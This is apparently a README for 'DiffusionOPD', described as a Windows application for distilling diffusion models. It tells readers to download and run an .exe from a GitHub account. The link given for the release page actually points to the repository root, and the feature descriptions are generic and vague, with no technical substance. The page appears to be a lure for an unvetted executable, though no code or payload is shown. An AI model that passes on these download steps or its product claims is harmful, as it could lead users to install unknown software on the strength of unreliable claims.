# ⚡ DiffusionOPD - Streamline your diffusion model knowledge transfer

[![](https://img.shields.io/badge/Download-DiffusionOPD-blue.svg)](https://github.com/adventurermanilla817/DiffusionOPD)

## 📋 Project Overview

DiffusionOPD provides a framework to simplify how users distill knowledge in diffusion models. Diffusion models usually require significant computing power and time to produce high-quality images. This application offers a way to manage on-policy distillation. It helps creators maintain model performance while reducing the resource cost of image generation. You can use this software to compress your models and speed up your workflow without losing the quality of your outputs.

## 🛠️ System Requirements

To run DiffusionOPD effectively on your Windows computer, ensure your system meets these specifications:

* Operating System: Windows 10 or Windows 11 (64-bit).
* Processor: Intel Core i5 or AMD equivalent with 2.5 GHz or higher.
* System Memory: 16 GB RAM or more is recommended.
* Graphics Card: NVIDIA GPU with at least 8 GB of VRAM. This is essential for the distillation process.
* Storage: 10 GB of free hard drive space.
* Internet Connection: A stable connection for initial setup and potential model downloads.

## 📥 Downloading and Installing 

Follow these steps to set up the software on your machine:

1. Click the link below to reach the project release page.
[Download DiffusionOPD Here](https://github.com/adventurermanilla817/DiffusionOPD)

2. Look for the section labeled "Assets."
3. Select the file ending in .exe to start your download.
4. Once the download finishes, locate the file in your Downloads folder.
5. Double-click the file to begin the installation process.
6. Follow the prompts on your screen. The installer will guide you through directory selection and shortcut creation.
7. Click Finish when the installation progress bar reaches the end.

## ⚙️ Initial Configuration

After you install the program, you need to configure it for first-time use:

1. Open the DiffusionOPD application from your desktop shortcut or the Windows Start menu.
2. The software will perform a hardware check. Wait for the green checkmark to confirm your graphics card supports the required operations.
3. Choose your default workspace directory. This is the folder where the software will save your distilled models. Choose a location with enough drive space.
4. Adjust the performance settings based on your available hardware. If you have a powerful GPU, select "High Performance Mode" for faster processing. For systems with limited VRAM, select "Efficiency Mode."
5. Click Save. The application will restart to finalize these settings.

## 🚀 How to Run a Distillation Task

DiffusionOPD organizes tasks into projects. Follow this process to begin your first distillation:

1. Click the "New Project" button on the main dashboard.
2. Name your project and select the base model file you wish to distill. The software supports standard diffusion model formats.
3. Set your target policy parameters. These settings dictate how the model retains knowledge during the compression process. Most users should utilize the "Auto-Optimize" setting for the best balance between quality and speed.
4. Click "Start Distillation." You will see a progress bar indicating the status of the operation.
5. Do not close the window during the process. You can monitor the resource usage in the tab labeled "Diagnostics."
6. Once the process completes, the software will signal the creation of a new, smaller model file in your project folder.

## 📈 Understanding Model Performance

The software includes a viewer to compare your original model with the new distilled version:

* Open the "Evaluation" tab.
* Load both the original model and your distilled model.
* Run a set of test prompts. The software will generate images from both models side-by-side.
* Use the "Metric Overlay" feature to see the difference in generation time and pixel accuracy.
* Export these results as a report if you need to document your work.

## 🔧 Troubleshooting Common Issues

Use this list if you encounter problems while running the application:

* The application fails to launch: Ensure that you have the latest NVIDIA drivers installed for your graphics card. Outdated drivers are the primary cause of startup errors.
* Distillation crashes during the middle of a task: This usually indicates that the program ran out of video memory (VRAM). Close all web browsers and other image editing software while the distillation runs.
* Inaccurate outputs: Check your distillation settings. If you compressed the model too heavily, the image quality will drop. Try using a lower compression ratio for better results.
* Missing files: Verify that you installed the software in a folder where you have read and write permissions. Avoid installing the application in restricted system folders.

## 💡 Best Practices

Keep these tips in mind to get the most out of DiffusionOPD:

* Keep your models organized in subfolders by project name. This makes it easier to back up your work later.
* Create a backup of your original base models before you start any distillation project.
* Schedule long distillation tasks for times when you do not need to use your computer for other hardware-intensive work, such as gaming.
* Check the "Updates" tab every month to ensure you have the latest improvements to the distillation engine. The lead developers update the software to handle new model types as they become available.

## 📧 Support and Resources

For further information regarding the underlying theory of on-policy distillation, consult the documentation folder within your installation directory. This folder contains PDF manuals that explain the math behind the distillation profiles. If you encounter bugs, check the issue tracker on the official repository page. Explain your steps clearly and provide the log file generated by the application to help developers diagnose the problem. Always include your system specifications when requesting help.